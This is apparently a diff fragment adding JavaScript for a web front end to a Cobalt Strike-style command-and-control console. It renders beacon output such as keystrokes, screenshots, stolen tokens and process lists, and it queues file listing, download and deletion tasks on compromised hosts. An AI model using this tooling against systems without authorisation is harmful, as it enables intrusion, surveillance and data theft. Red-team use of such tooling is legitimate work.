+                                outputEl.innerHTML += `<span style="color: var(--terminal-success);">[+] [job ${jid}] received output:</span>\n`;
+                            }
+                            outputEl.innerHTML += this.formatTaskResult(r);
+                        });
+                    }
+                    // Show errors
+                    const errors = t.error || [];
+                    errors.forEach(e => {
+                        const msg = typeof e === 'string' ? e : (e.output || e.message || e.text || JSON.stringify(e));
+                        outputEl.innerHTML += `<span style="color: var(--terminal-danger);">[-] ${this.escapeHtml(msg)}</span>\n`;
+                    });
+                    // Show job completion like CS client: "[+] job 59 completed"
+                    if (jid) {
+                        outputEl.innerHTML += `<span style="color: var(--terminal-success);">[+] job ${jid} completed</span>\n`;
+                    }
+                    outputEl.scrollTop = outputEl.scrollHeight;
+                    this._saveHistory(this.selectedBid);
+                    return;
+                }
+
+                // For tasks that stay IN_PROGRESS but have acknowledgements and no results
+                if (status === 'IN_PROGRESS' && acks.length > 0 && attempts >= 3) {
+                    outputEl.scrollTop = outputEl.scrollHeight;
+                    this._saveHistory(this.selectedBid);
+                    return;
+                }
+            }
+        } catch (e) { /* retry */ }
+
+        this.pollTaskOutput(taskId, outputEl, attempts + 1);
+    },
+
+    // ── Live Task Feed — shows ALL beacon activity including external commands ──
+    startTaskFeed(bid) {
+        this.stopTaskFeed();
+        this._taskFeedBid = bid;
+        this._taskFeedKnown.clear();
+        this._taskFeedPolling.clear();
+        console.log('[TaskFeed] Starting live feed for beacon', bid);
+        // First poll seeds known IDs without rendering
+        this._pollTaskFeed(true).then(() => {
+            console.log('[TaskFeed] Seeded', this._taskFeedKnown.size, 'existing tasks');
+            this._taskFeedTimer = setInterval(() => this._pollTaskFeed(false), 3000);
+        });
+    },
+
+    stopTaskFeed() {
+        if (this._taskFeedTimer) {
+            clearInterval(this._taskFeedTimer);
+            this._taskFeedTimer = null;
+        }
+    },
+
+    async _pollTaskFeed(seedOnly) {
+        const bid = this._taskFeedBid;
+        if (!bid || this.connectionStatus !== 'connected') return;
+        try {
+            const resp = await fetch(`/api/beacon/${bid}/tasks`);
+            const data = await resp.json();
+            if (!data.success) return;
+            const tasks = data.tasks || [];
+            const output = document.getElementById('beacon-command-output');
+            if (!output) return;
+
+            for (const t of tasks) {
+                const tid = t.taskId;
+                if (!tid) continue;
+                if (this._taskFeedKnown.has(tid)) continue;
+                this._taskFeedKnown.add(tid);
+                if (seedOnly) continue; // first pass just learns existing task IDs
+
+                // New task we haven't seen — render it in the console
+                console.log('[TaskFeed] New external task:', tid, t.taskCommand);
+                const ts = new Date().toLocaleTimeString();
+                const cmd = t.taskCommand || '?';
+                const user = (t.user || '').split('@')[0] || 'api';
+                output.innerHTML += `<div class="task-card task-card--queued"><span style="color: var(--text-terminal); opacity: 0.6;">[${ts}]</span> <span style="color: var(--terminal-warning);">[${this.escapeHtml(user)}]</span> <span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">${this.escapeHtml(cmd)}</span>`;
+
+                // Auto-poll for output if not already polling
+                if (!this._taskFeedPolling.has(tid)) {
+                    this._taskFeedPolling.add(tid);
+                    this.pollTaskOutput(tid, output);
+                }
+                output.scrollTop = output.scrollHeight;
+                this._saveHistory(bid);
+            }
+        } catch (e) { /* silent */ }
+    },
+
+    formatTaskResult(r) {
+        if (typeof r === 'string') {
+            return `<span class="t-terminal">${this.escapeHtml(r)}</span>\n`;
+        }
+        const rtype = r.type || 'text';
+
+        // Structured: ls (directory listing)
+        if (rtype === 'ls' && r.contents) {
+            const folder = this.escapeHtml(r.folder || '');
+            const entries = r.contents.filter(f => f.name !== '.' && f.name !== '..');
+            const header = `<span style="color: var(--terminal-info);">[*] Listing: ${folder}</span>\n\n`;
+            const colHead = `<span class="t-terminal"> Size     Type    Last Modified         Name</span>\n`
+                          + `<span class="t-terminal"> ----     ----    -------------         ----</span>\n`;
+            const rows = entries.map(f => {
+                const size = this.formatFileSize(f.size).padStart(5);
+                const type = f.type === 'dir' ? 'dir ' : 'fil ';
+                const mod = (f.modified || '').padEnd(21);
+                const name = this.escapeHtml(f.name);
+                const color = f.type === 'dir' ? 'var(--terminal-info)' : 'var(--text-terminal)';
+                return `<span style="color: ${color};"> ${size}    ${type}    ${mod} ${name}</span>`;
+            }).join('\n');
+            return header + `<div style="overflow-x: auto; white-space: pre;">` + colHead + rows + `</div>\n`;
+        }
+
+        // Structured: ps (process list)
+        if (rtype === 'ps' && r.processList) {
+            const procs = r.processList;
+            const header = `<span style="color: var(--terminal-info);">[*] Process List (${procs.length} processes)</span>\n\n`;
+            const colHead = `<span class="t-terminal"> PID    PPID   Name                          Arch   Session  User</span>\n`
+                          + `<span class="t-terminal"> ---    ----   ----                          ----   -------  ----</span>\n`;
+            const rows = procs.map(p => {
+                const pid = String(p.pid ?? '').padStart(5);
+                const ppid = String(p.ppid ?? '').padStart(5);
+                const name = this.escapeHtml((p.process || '').padEnd(28));
+                const arch = (p.arch || '').padEnd(6);
+                const sess = String(p.sessid ?? '').padEnd(8);
+                const user = this.escapeHtml(p.user || '');
+                return `<span class="t-terminal">${pid}  ${ppid}   ${name}  ${arch} ${sess} ${user}</span>`;
+            }).join('\n');
+            return header + `<div style="overflow-x: auto; white-space: pre;">` + colHead + rows + `</div>\n`;
+        }
+
+        // Structured: jobs
+        if (rtype === 'jobs' && r.jobs) {
+            const jobs = r.jobs;
+            const header = `<span style="color: var(--terminal-info);">[*] Jobs (${jobs.length})</span>\n\n`;
+            const colHead = `<span class="t-terminal"> JID  PID   Description</span>\n`
+                          + `<span class="t-terminal"> ---  ---   -----------</span>\n`;
+            const rows = jobs.map(j => {
+                const jid = String(j.jid ?? '').padStart(3);
+                const pid = String(j.pid ?? '').padStart(4);
+                const desc = this.escapeHtml(j.description || '');
+                return `<span class="t-terminal">${jid}  ${pid}   ${desc}</span>`;
+            }).join('\n');
+            return header + `<div style="overflow-x: auto; white-space: pre;">` + colHead + rows + `</div>\n`;
+        }
+
+        // Structured: keystrokes
+        if (rtype === 'keystrokes' && r.data) {
+            const header = `<span style="color: var(--terminal-info);">[*] Keystrokes</span>\n`;
+            return header + `<div style="overflow-x: auto; white-space: pre;">${this.escapeHtml(r.data)}</div>\n`;
+        }
+
+        // Structured: screenshots
+        if (rtype === 'screenshot' && r.data) {
+            return `<span style="color: var(--terminal-info);">[*] Screenshot received</span>\n`;
+        }
+
+        // Structured: tokenStore
+        if (rtype === 'tokenStore') {
+            const tokens = r.tokens || [];
+            const header = `<span style="color: var(--terminal-info);">[*] Token Store</span>\n\n`;
+            const colHead = `<span class="t-terminal"> ID   PID   User</span>\n`
+                          + `<span class="t-terminal"> --   ---   ----</span>\n`;
+            if (tokens.length === 0) {
+                return header + colHead + `<span class="t-terminal">      (empty)</span>\n`;
+            }
+            const rows = tokens.map(t => {
+                const id = String(t.id ?? '').padStart(3);
+                const pid = String(t.pid ?? '').padStart(4);
+                const user = this.escapeHtml(t.user || '');
+                return `<span class="t-terminal">${id}  ${pid}   ${user}</span>`;
+            }).join('\n');
+            return header + `<div style="overflow-x: auto; white-space: pre;">` + colHead + rows + `</div>\n`;
+        }
+
+        // Structured: tokenStoreSteal (result of stealing a token)
+        if (rtype === 'tokenStoreSteal') {
+            const user = r.user || 'Unknown';
+            const pid = r.pid || '?';
+            return `<span style="color: var(--terminal-success);">[+] Token stolen from PID ${pid}: ${this.escapeHtml(user)}</span>\n`;
+        }
+
+        // Structured: tokenStoreUse / tokenStoreStealAndUse
+        if (rtype === 'tokenStoreUse' || rtype === 'tokenStoreStealAndUse') {
+            const user = r.user || '';
+            return `<span style="color: var(--terminal-success);">[+] Impersonating: ${this.escapeHtml(user)}</span>\n`;
+        }
+
+        // Structured: beaconInfo
+        if (rtype === 'beaconInfo' && r.output) {
+            return `<span style="color: var(--terminal-info);">[*] Beacon Information</span>\n` +
+                   `<div style="overflow-x: auto; white-space: pre;">${this.escapeHtml(r.output.trimEnd())}</div>\n`;
+        }
+
+        // Structured: hostCallback (C2 host info)
+        if (rtype === 'hostCallback' && r.output) {
+            return `<span style="color: var(--terminal-success);">[+] ${this.escapeHtml(r.output.trimEnd())}</span>\n`;
+        }
+
+        // Generic structured output — format as readable text instead of raw JSON
+        if (r.output) {
+            const text = r.output;
+            return `<div style="overflow-x: auto; white-space: pre;">${this.escapeHtml(text.replace(/\r\n/g, '\n').trimEnd())}</div>\n`;
+        }
+
+        // Fallback: format unknown structured data as a readable table
+        const fallback = JSON.stringify(r, null, 2);
+        return `<div style="overflow-x: auto; white-space: pre;">${this.escapeHtml(fallback)}</div>\n`;
+    },
+
+    formatFileSize(bytes) {
+        if (!bytes || bytes === 0) return '0b';
+        if (bytes < 1024) return `${bytes}b`;
+        if (bytes < 1048576) return `${Math.round(bytes / 1024)}kb`;
+        if (bytes < 1073741824) return `${(bytes / 1048576).toFixed(1)}mb`;
+        return `${(bytes / 1073741824).toFixed(1)}gb`;
+    },
+
+    escapeHtml(str) {
+        const div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    },
+
+    escapeAttr(str) {
+        return String(str).replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    },
+
+    copyTunnelCmd(button) {
+        if (this.tunnelCmd && typeof copyToClipboard === 'function') {
+            copyToClipboard(this.tunnelCmd, button);
+        }
+    },
+
+    // ══════════════════════════════════════════════════════════════════
+    // Feature Panel Methods
+    // ══════════════════════════════════════════════════════════════════
+
+    switchTab(tabName) {
+        // Update tab buttons
+        document.querySelectorAll('.beacon-ftab').forEach(btn => {
+            btn.classList.toggle('active', btn.dataset.panel === tabName);
+        });
+        // Update panels
+        document.querySelectorAll('.beacon-fpanel').forEach(panel => {
+            const id = panel.id.replace('beacon-panel-', '');
+            if (id === tabName) {
+                panel.style.display = '';
+                panel.classList.add('active');
+            } else {
+                panel.style.display = 'none';
+                panel.classList.remove('active');
+            }
+        });
+        // Auto-load data when switching to each tab
+        if (this.selectedBid) {
+            switch (tabName) {
+                case 'files': {
+                    const body = document.getElementById('file-browser-body');
+                    if (body && (!body.innerHTML || body.innerHTML.includes('Navigate') || body.innerHTML.includes('navigate')))
+                        this._restoreFileBrowser();
+                    break;
+                }
+                case 'listeners':
+                    if (this._listenerCache) this._renderListenerCache();
+                    else this.loadListeners();
+                    break;
+                case 'processes':
+                    this.loadProcesses();
+                    break;
+                case 'jobs':
+                    this.loadJobs();
+                    break;
+                case 'creds':
+                    this.loadCredentialVault();
+                    break;
+                case 'tokens':
+                    this.loadTokenStore();
+                    break;
+            }
+        }
+    },
+
+    // ── Console Logging (mirrors tab actions in console like real CS) ──
+    _logResultToConsole(text, type) {
+        // Echo task results to console like CS client event log
+        const output = document.getElementById('beacon-command-output');
+        if (!output || !text) return;
+        const lines = text.split('\n').filter(l => l.trim());
+        lines.forEach(line => {
+            const prefix = type === 'error' ? '[-]' : type === 'info' ? '[*]' : '[+]';
+            const color = type === 'error' ? 'var(--terminal-danger)' : type === 'info' ? 'var(--terminal-info)' : 'var(--terminal-success)';
+            output.innerHTML += `<span style="color: ${color};">${prefix} ${this.escapeHtml(line)}</span>\n`;
+        });
+        output.scrollTop = output.scrollHeight;
+    },
+
+    _logToConsole(command, tabHint) {
+        const output = document.getElementById('beacon-command-output');
+        if (!output) return;
+        const ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
+        const hint = tabHint ? ` <span style="color: var(--terminal-info); font-style: italic;">\u2192 see ${this.escapeHtml(tabHint)} tab</span>` : '';
+        output.innerHTML += `<div class="task-card task-card--queued"><span style="color: var(--text-terminal); opacity: 0.6;">[${ts}]</span> <span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">${this.escapeHtml(command)}</span>${hint}`;
+        output.scrollTop = output.scrollHeight;
+    },
+
+    // Called by tab handlers after getting a taskId — logs full CS-client output to console
+    _trackTaskInConsole(taskId) {
+        if (!taskId) return;
+        const output = document.getElementById('beacon-command-output');
+        if (!output) return;
+        // Mark as known so task feed doesn't duplicate
+        this._taskFeedKnown.add(taskId);
+        this._taskFeedPolling.add(taskId);
+        // Poll and render full output (acks, callback, job ID, results, completion) in console
+        this.pollTaskOutput(taskId, output);
+    },
+
+    // ── File Browser ──────────────────────────────────────────────
+    currentPath: '',
+    _fileBrowserCache: null,
+
+    _cacheFileBrowser() {
+        const body = document.getElementById('file-browser-body');
+        if (body && this.selectedBid) {
+            try {
+                sessionStorage.setItem('beacon_file_cache_' + this.selectedBid, JSON.stringify({
+                    path: this.currentPath,
+                    html: body.innerHTML,
+                    time: Date.now(),
+                }));
+            } catch (e) { /* quota exceeded */ }
+        }
+    },
+
+    _restoreFileBrowser() {
+        if (!this.selectedBid) return false;
+        try {
+            const cached = sessionStorage.getItem('beacon_file_cache_' + this.selectedBid);
+            if (!cached) return false;
+            const data = JSON.parse(cached);
+            // Only use cache if less than 5 minutes old
+            if (Date.now() - data.time > 300000) return false;
+            const body = document.getElementById('file-browser-body');
+            const pathBar = document.getElementById('file-path-bar');
+            if (body) {
+                body.innerHTML = data.html;
+                this.currentPath = data.path || '';
+                if (pathBar) pathBar.value = this.currentPath;
+                return true;
+            }
+        } catch (e) { /* ignore */ }
+        return false;
+    },
+
+    async loadFiles(path) {
+        if (!this.selectedBid) return;
+        this._logToConsole('ls ' + (path || ''), 'Files');
+        const body = document.getElementById('file-browser-body');
+        const pathBar = document.getElementById('file-path-bar');
+        if (!body) return;
+        body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Loading...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/fs/ls`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ path: path || '' }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                this.currentPath = path || this.currentPath;
+                if (pathBar) pathBar.value = this.currentPath || '/';
+                const _tid = (data.result?.taskId || data.data?.taskId);
+                this._pollFileResults(_tid, body);
+                this._trackTaskInConsole(_tid);
+            } else {
+                body.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) {
+            body.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async _pollFileResults(taskId, container, attempts = 0) {
+        if (attempts > 20) {
+            container.innerHTML += '<div class="t-warning" style="padding: 8px 12px;">Polling timed out</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const results = data.task.result || data.task.results || [];
+                    if (Array.isArray(results) && results.length > 0) {
+                        // Use the first result's structured data
+                        const r = results[0];
+                        this._renderFileTable(r.data || r.output || r, container);
+                    } else if (typeof results === 'object' && !Array.isArray(results)) {
+                        this._renderFileTable(results, container);
+                    } else {
+                        // Fallback: try extracting text output from task
+                        const text = this._extractTaskOutput(data.task);
+                        container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+                    }
+                    return;
+                }
+            }
+            this._pollFileResults(taskId, container, attempts + 1);
+        } catch (e) {
+            this._pollFileResults(taskId, container, attempts + 1);
+        }
+    },
+
+    _renderFileTable(result, container) {
+        // Try to parse structured ls output
+        let entries = [];
+        if (result && typeof result === 'object') {
+            // Structured response from CS API
+            if (Array.isArray(result)) entries = result;
+            else if (result.entries) entries = result.entries;
+            else if (result.contents) entries = result.contents;
+            else if (result.output) {
+                // Plain text ls output — parse it
+                const text = typeof result.output === 'string' ? result.output : this._extractTaskOutput(result);
+                container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+                return;
+            }
+        }
+        if (typeof result === 'string') {
+            container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(result)}</pre>`;
+            return;
+        }
+        if (entries.length === 0 && typeof result === 'object') {
+            // Fallback: extract readable text
+            const text = this._extractTaskOutput(result);
+            container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+            return;
+        }
+        let html = '<table class="file-table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody>';
+        // Add parent directory entry
+        if (this.currentPath && this.currentPath !== '/') {
+            html += `<tr class="file-entry--dir" onclick="BEACON.fileUp()"><td>📁 ..</td><td></td><td></td><td></td></tr>`;
+        }
+        entries.filter(e => e.name !== '.' && e.name !== '..').forEach(e => {
+            const isDir = e.type === 'directory' || e.type === 'dir' || e.isDir || (e.name && e.name.endsWith('/'));
+            const name = this.escapeHtml(e.name || e.fileName || '');
+            const size = isDir ? '' : this.formatFileSize(e.size || 0);
+            const date = e.modified || e.date || '';
+            if (isDir) {
+                const dirPath = this.currentPath ? `${this.currentPath}\\${e.name || e.fileName}` : (e.name || e.fileName);
+                html += `<tr class="file-entry--dir" onclick="BEACON.loadFiles('${this.escapeAttr(dirPath)}')"><td>📁 ${name}</td><td></td><td class="file-date">${this.escapeHtml(date)}</td><td></td></tr>`;
+            } else {
+                const filePath = this.currentPath ? `${this.currentPath}\\${e.name || e.fileName}` : (e.name || e.fileName);
+                html += `<tr class="file-entry--file"><td>📄 ${name}</td><td class="file-size">${size}</td><td class="file-date">${this.escapeHtml(date)}</td><td class="file-actions"><button onclick="BEACON.fileDownload('${this.escapeAttr(filePath)}')">Download</button> <button onclick="BEACON.fileDelete('${this.escapeAttr(filePath)}')">Delete</button></td></tr>`;
+            }
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+        this._cacheFileBrowser();
+    },
+
+    fileUp() {
+        if (!this.currentPath) return;
+        const parts = this.currentPath.replace(/\//g, '\\').split('\\');
+        parts.pop();
+        const parent = parts.join('\\') || '';
+        this.loadFiles(parent || 'C:\\');
+    },
+
+    fileRefresh() {
+        this.loadFiles(this.currentPath || '');
+    },
+
+    async filePwd() {
+        if (!this.selectedBid) return;
+        this._logToConsole('pwd', 'Files');
+        const body = document.getElementById('file-browser-body');
+        const pathBar = document.getElementById('file-path-bar');
+        if (!body) return;
+        body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Getting working directory...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'pwd' }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                const _tid2 = (data.result?.taskId || data.data?.taskId);
+                this._pollPwdResult(_tid2, body, pathBar);
+                this._trackTaskInConsole(_tid2);
+            } else {
+                body.innerHTML = '<div style="padding: 12px;" class="t-danger">Failed to get working directory</div>';
+            }
+        } catch (e) {
+            body.innerHTML = '<div style="padding: 12px;" class="t-danger">Error: ' + this.escapeHtml(e.message) + '</div>';
+        }
+    },
+
+    async _pollPwdResult(taskId, body, pathBar, attempts = 0) {
+        if (attempts > 15) {
+            body.innerHTML = '<div class="t-warning" style="padding: 8px 12px;">Polling timed out</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch('/api/beacon/task/' + taskId);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const results = data.task.result || data.task.results || [];
+                    let path = '';
+                    if (Array.isArray(results) && results.length > 0) {
+                        const r = results[0];
+                        path = (typeof r === 'string' ? r : (r.output || r.data || JSON.stringify(r))).trim();
+                    } else if (typeof results === 'string') {
+                        path = results.trim();
+                    }
+                    // CS returns "Current directory is C:\path" — strip the prefix
+                    const pwdPrefix = /^Current directory is\s+/i;
+                    if (pwdPrefix.test(path)) {
+                        path = path.replace(pwdPrefix, '').trim();
+                    }
+                    if (path) {
+                        this.currentPath = path;
+                        if (pathBar) pathBar.value = path;
+                        this.loadFiles(path);
+                    } else {
+                        body.innerHTML = '<div style="padding: 12px;" class="t-muted">Could not determine working directory. Try navigating manually.</div>';
+                    }
+                    return;
+                }
+            }
+            this._pollPwdResult(taskId, body, pathBar, attempts + 1);
+        } catch (e) {
+            this._pollPwdResult(taskId, body, pathBar, attempts + 1);
+        }
+    },
+
+    async fileDrives() {
+        if (!this.selectedBid) return;
+        this._logToConsole('drives', 'Files');
+        const body = document.getElementById('file-browser-body');
+        if (!body) return;
+        body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Loading drives...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/fs/drives`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                const _tid3 = (data.result?.taskId || data.data?.taskId);
+                this._pollDriveResults(_tid3, body);
+                this._trackTaskInConsole(_tid3);
+            } else {
+                body.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) {
+            body.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async _pollDriveResults(taskId, container, attempts = 0) {
+        if (attempts > 20) { container.innerHTML += '<div class="t-warning" style="padding: 8px 12px;">Polling timed out</div>'; return; }
+        await new Promise(r => setTimeout(r, attempts < 3 ? 2000 : 4000));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    // Extract drive letters from results
+                    const results = data.task.result || data.task.results || [];
+                    let drives = [];
+                    const extract = (obj) => {
+                        if (typeof obj === 'string') {
+                            // Parse "C: D: E:" or "C:\nD:\n" patterns
+                            obj.split(/[\s,;\n]+/).forEach(d => { const m = d.match(/^([A-Z]):?\\?$/i); if (m) drives.push(m[1].toUpperCase()); });
+                        } else if (Array.isArray(obj)) {
+                            obj.forEach(item => {
+                                if (typeof item === 'string') extract(item);
+                                else if (item?.name) extract(item.name);
+                                else if (item?.output) extract(item.output);
+                                else if (item?.data) extract(typeof item.data === 'string' ? item.data : JSON.stringify(item.data));
+                            });
+                        } else if (obj?.output) extract(obj.output);
+                        else if (obj?.drives) obj.drives.forEach(d => drives.push(d.replace(/[:\\]/g, '').toUpperCase()));
+                    };
+                    extract(results);
+                    if (drives.length === 0) drives = ['C']; // fallback
+                    drives = [...new Set(drives)].sort();
+
+                    // Render drive buttons
+                    let html = '<div style="padding: 20px;">';
+                    html += '<div style="margin-bottom: 12px; color: var(--text-secondary); font-weight: 600;">Available Drives</div>';
+                    html += '<div style="display: flex; flex-wrap: wrap; gap: 10px;">';
+                    drives.forEach(d => {
+                        html += `<button class="btn btn-sm btn-info" onclick="BEACON.loadFiles('${d}:\\\\')" style="min-width: 80px; padding: 12px 16px; font-size: 1.1em;">`
+                              + `<span style="font-size: 1.3em;">💾</span> ${this.escapeHtml(d)}:\\</button>`;
+                    });
+                    html += '</div>';
+                    html += '<div style="margin-top: 12px; color: var(--text-muted);">Click a drive to browse its contents</div>';
+                    html += '</div>';
+                    container.innerHTML = html;
+                    this.currentPath = '';
+                    const pathBar = document.getElementById('file-path-bar');
+                    if (pathBar) pathBar.value = '';
+                    return;
+                }
+            }
+            this._pollDriveResults(taskId, container, attempts + 1);
+        } catch (e) {
+            this._pollDriveResults(taskId, container, attempts + 1);
+        }
+    },
+
+    async fileMkdir() {
+        const name = prompt('Directory name:');
+        if (!name || !this.selectedBid) return;
+        const path = this.currentPath ? `${this.currentPath}\\${name}` : name;
+        this._logToConsole('mkdir ' + path, 'Files');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/fs/mkdir`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ path }),
+            });
+            const data = await resp.json();
+            const taskId = data.result?.taskId || data.data?.taskId;
+            if (taskId) {
+                const output = document.getElementById('beacon-command-output');
+                if (output) { output.innerHTML += `<span style="color: var(--terminal-info);">[*] mkdir queued</span>\n`; output.scrollTop = output.scrollHeight; }
+                this._taskFeedKnown.add(taskId); this._taskFeedPolling.add(taskId);
+                this.pollTaskOutput(taskId, output || document.createElement('div'));
+            }
+            setTimeout(() => this.fileRefresh(), 3000);
+        } catch (e) { /* ignore */ }
+    },
+
+    async fileDelete(path) {
+        if (!confirm(`Delete ${path}?`)) return;
+        this._logToConsole('rm ' + path, 'Files');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/fs/rm`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ path }),
+            });
+            const data = await resp.json();
+            const taskId = data.result?.taskId || data.data?.taskId;
+            if (taskId) {
+                const output = document.getElementById('beacon-command-output');
+                if (output) { output.innerHTML += `<span style="color: var(--terminal-info);">[*] rm queued</span>\n`; output.scrollTop = output.scrollHeight; }
+                this._taskFeedKnown.add(taskId); this._taskFeedPolling.add(taskId);
+                this.pollTaskOutput(taskId, output || document.createElement('div'));
+            }
+            setTimeout(() => this.fileRefresh(), 3000);
+        } catch (e) { /* ignore */ }
+    },
+
+    async fileDownload(path) {
+        if (!this.selectedBid) return;
+        this._logToConsole('download ' + path, 'Files');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/fs/download`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ path }),
+            });
+            const data = await resp.json();
+            if (data.success) {
+                const taskId = data.result?.taskId || data.data?.taskId;
+                this.switchTab('console');
+                const output = document.getElementById('beacon-command-output');
+                if (output) output.innerHTML += `<div class="task-card task-card--queued"><span style="color: var(--terminal-info);">[*] Download started: ${this.escapeHtml(path)}</span></div>\n`;
+                if (taskId) this._trackTaskInConsole(taskId);
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    // ── Process Browser ──────────────────────────────────────────
+    processData: [],
+
+    _getBeaconPid() {
+        if (!this.selectedBid) return null;
+        const b = this.cachedBeacons.find(x => String(x.bid) === String(this.selectedBid));
+        return b ? b.pid : null;
+    },
+
+    async loadProcesses() {
+        if (!this.selectedBid) return;
+        this._logToConsole('ps', 'Processes');
+        const body = document.getElementById('process-browser-body');
+        if (!body) return;
+        body.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Loading processes...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/ps`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                const _tid4 = (data.result?.taskId || data.data?.taskId);
+                this._pollProcessResults(_tid4, body);
+                this._trackTaskInConsole(_tid4);
+            } else {
+                body.innerHTML = `<div style="padding: 12px;" class="t-danger">${this.escapeHtml(data.error || 'Failed')}</div>`;
+            }
+        } catch (e) {
+            body.innerHTML = `<div style="padding: 12px;" class="t-danger">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    async _pollProcessResults(taskId, container, attempts = 0) {
+        if (attempts > 20) {
+            container.innerHTML += '<div class="t-warning" style="padding: 8px 12px;">Polling timed out</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const results = data.task.result || data.task.results || [];
+                    if (Array.isArray(results) && results.length > 0) {
+                        const r = results[0];
+                        this._renderProcessTable(r.data || r.output || r, container);
+                    } else if (typeof results === 'object' && !Array.isArray(results)) {
+                        this._renderProcessTable(results, container);
+                    } else {
+                        const text = this._extractTaskOutput(data.task);
+                        container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+                    }
+                    return;
+                }
+            }
+            this._pollProcessResults(taskId, container, attempts + 1);
+        } catch (e) {
+            this._pollProcessResults(taskId, container, attempts + 1);
+        }
+    },
+
+    _renderProcessTable(result, container) {
+        let procs = [];
+        if (Array.isArray(result)) procs = result;
+        else if (result?.processList) procs = result.processList;
+        else if (result?.processes) procs = result.processes;
+        else if (typeof result === 'string' || (result && result.output)) {
+            const text = typeof result === 'string' ? result : result.output;
+            container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+            return;
+        } else {
+            const text = this._extractTaskOutput(result);
+            container.innerHTML = `<pre style="padding: 12px; white-space: pre-wrap; color: var(--text-terminal);">${this.escapeHtml(text)}</pre>`;
+            return;
+        }
+        this.processData = procs;
+        this._drawProcessTable(procs, container);
+    },
+
+    _drawProcessTable(procs, container) {
+        // Build parent chain set — walk up PPIDs from beacon's PID
+        const beaconPid = this._getBeaconPid();
+        const parentPids = new Set();
+        if (beaconPid) {
+            const pidMap = {};
+            procs.forEach(p => { pidMap[p.pid || p.PID] = p.ppid || p.PPID; });
+            let walk = pidMap[beaconPid];
+            let depth = 0;
